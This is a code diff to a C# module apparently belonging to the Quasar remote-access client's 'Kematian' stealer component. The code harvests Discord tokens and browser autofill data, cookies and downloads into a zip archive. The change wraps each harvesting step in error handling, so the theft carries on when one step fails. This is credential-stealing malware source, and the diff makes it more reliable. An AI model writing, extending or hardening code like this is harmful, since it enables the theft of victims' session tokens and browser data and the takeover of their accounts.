@@ -1,6 +1,7 @@
 ﻿using Quasar.Client.Kematian.Browsers;
 using Quasar.Client.Kematian.Discord;
 using System;
+using System.Diagnostics;
 using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
@@ -25,7 +26,6 @@ namespace Quasar.Client.Kematian
                     var methods = new KeyValuePair<Func<string>, string>[]
                     {
                             new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
-
                             new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
                             new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
                             new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
@@ -35,12 +35,19 @@ namespace Quasar.Client.Kematian
 
                     Parallel.ForEach(methods, methodPair =>
                     {
-                        var content = methodPair.Key();
-                        var zipEntry = archive.CreateEntry(methodPair.Value);
-                        using (var entryStream = new BufferedStream(zipEntry.Open()))
-                        using (var streamWriter = new StreamWriter(entryStream))
+                        try
                         {
-                            streamWriter.Write(content);
+                            var content = methodPair.Key();
+                            var zipEntry = archive.CreateEntry(methodPair.Value);
+                            using (var entryStream = new BufferedStream(zipEntry.Open()))
+                            using (var streamWriter = new StreamWriter(entryStream))
+                            {
+                                streamWriter.Write(content);
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
                         }
                     });
                 }
